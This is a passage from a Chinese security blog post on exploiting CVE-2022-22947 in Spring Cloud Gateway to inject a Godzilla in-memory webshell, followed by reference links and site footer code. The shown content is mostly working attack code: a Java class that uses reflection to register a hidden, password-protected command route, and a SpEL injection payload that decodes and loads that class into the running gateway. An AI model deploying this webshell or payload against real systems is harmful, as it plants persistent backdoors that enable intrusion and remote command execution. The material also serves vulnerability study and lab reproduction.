+<figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-3dnfqfls7tkuwt"></i><span>  Java  </span><div class="collapse show" id="collapse-3dnfqfls7tkuwt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.DigestUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.result.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GMemShell</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, Object&gt; store = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> String pass, md5, key;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">doInject</span><span class="params">(Object obj, String path, String passStr, String keyStr)</span> &#123;</span><br><span class="line">    String msg;</span><br><span class="line">    </span><br><span class="line">    pass = passStr;</span><br><span class="line">    key = DigestUtils.md5DigestAsHex(keyStr.getBytes()).substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      md5 = md5(pass + key);</span><br><span class="line">      <span class="type">Method</span> <span class="variable">registerHandlerMethod</span> <span class="operator">=</span> obj.getClass().getDeclaredMethod(<span class="string">&quot;registerHandlerMethod&quot;</span>, Object.class, Method.class, RequestMappingInfo.class);</span><br><span class="line">      registerHandlerMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      <span class="type">Method</span> <span class="variable">executeCommand</span> <span class="operator">=</span> GMemShell.class.getDeclaredMethod(<span class="string">&quot;cmd&quot;</span>, ServerWebExchange.class);</span><br><span class="line">      <span class="type">RequestMappingInfo</span> <span class="variable">requestMappingInfo</span> <span class="operator">=</span> RequestMappingInfo.paths(path).build();</span><br><span class="line">      registerHandlerMethod.invoke(obj, <span class="keyword">new</span> <span class="title class_">GMemShell</span>(), executeCommand, requestMappingInfo);</span><br><span class="line">      msg = <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      msg = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> msg;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>同样地，SpEL 表达式也需要稍微修改下，添加接收密码和密钥参数</p>
+<figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-ggdvtsls7tkuwt"></i><span>  Java  </span><div class="collapse show" id="collapse-ggdvtsls7tkuwt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(<span class="string">&#x27;GMemShell&#x27;</span>,T(org.springframework.util.Base64Utils).decodeFromString(<span class="string">&#x27;&lt;Base64字符串&gt;&#x27;</span>),<span class="keyword">new</span> <span class="title class_">javax</span>.management.loading.MLet(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[<span class="number">0</span>],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(<span class="meta">@requestMappingHandlerMapping</span>, <span class="string">&#x27;&lt;/路由&gt;&#x27;</span>,<span class="string">&#x27;&lt;密码&gt;&#x27;</span>,<span class="string">&#x27;&lt;密钥&gt;&#x27;</span>)&#125;</span><br></pre></td></tr></table></div></figure>
+<p><a data-fancybox="gallery" data-src="/assets/Spring-Cloud-Gateway-MemShell-13.png" data-caption="Spring-Cloud-Gateway-MemShell-13"><img src="/assets/Spring-Cloud-Gateway-MemShell-13.png" alt="Spring-Cloud-Gateway-MemShell-13"></a></p>
+<p><a data-fancybox="gallery" data-src="/assets/Spring-Cloud-Gateway-MemShell-14.png" data-caption="Spring-Cloud-Gateway-MemShell-14"><img src="/assets/Spring-Cloud-Gateway-MemShell-14.png" alt="Spring-Cloud-Gateway-MemShell-14"></a></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/spring/CVE-2022-22947/">Vulhub&#x2F;CVE-2022-22947</a></li>
+<li><a target="_blank" rel="noopener" href="https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/#0x01-%E9%AB%98%E5%8F%AF%E7%94%A8Payload">Spring cloud gateway通过SPEL注入内存马</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.wanghw.cn/tech-share/cve-2022-22947-inject-godzilla-memshell.html">CVE-2022-22947 注入哥斯拉内存马</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.fangzhipeng.com/springcloud/2018/12/21/sc-f-gatway3.html">Spring cloud gateway之Filter篇</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/lists/">Lists</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">Spring Cloud Gateway 内存马注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.2.2.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.3.</span> <span class="toc-text">哥斯拉内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">1.3.1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0"><span class="toc-number">1.3.2.</span> <span class="toc-text">构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A51"><span class="toc-number">1.3.3.</span> <span class="toc-text">注入1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A52"><span class="toc-number">1.3.4.</span> <span class="toc-text">注入2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.4.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&text=Spring Cloud Gateway 内存马注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&title=Spring Cloud Gateway 内存马注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&is_video=false&description=Spring Cloud Gateway 内存马注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Spring Cloud Gateway 内存马注入&body=Check out this article: https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&title=Spring Cloud Gateway 内存马注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&title=Spring Cloud Gateway 内存马注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&title=Spring Cloud Gateway 内存马注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&title=Spring Cloud Gateway 内存马注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&name=Spring Cloud Gateway 内存马注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&t=Spring Cloud Gateway 内存马注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2017-2023
+    M1r0ku
+  </div>
+  <div class="footer-right">
+    <nav>
+    <!--
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+       
+          <li><a href="/lists/">Lists</a></li>
+       
+          <li><a href="/links/">Links</a></li>
+       
+          <li><a href="/search/">Search</a></li>
+       
+      </ul>
+    -->
+      
+      <!-- 不蒜子统计 -->
+        <ul>
+          
+          <span id="busuanzi_container_site_pv">
+            <i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span>
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+            <i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span> 
+          </span>
+          <script async src="//cdn.bootcdn.net/ajax/libs/busuanzi/2.3.0/bsz.pure.mini.js"></script>
+          
+      </ul>
+      
+    </nav>
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?864b0988af87a8a8f5f115cd29c265de";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'M1r0ku/m1r0ku.github.io';
+      var utterances_issue_term = 'title';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'photon-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+
+<!-- FancyBox -->
+
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+<!-- hexo injector body_end start --><script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script><link rel="stylesheet" href="/css/customize.css"><!-- hexo injector body_end end --></body>
+</html>
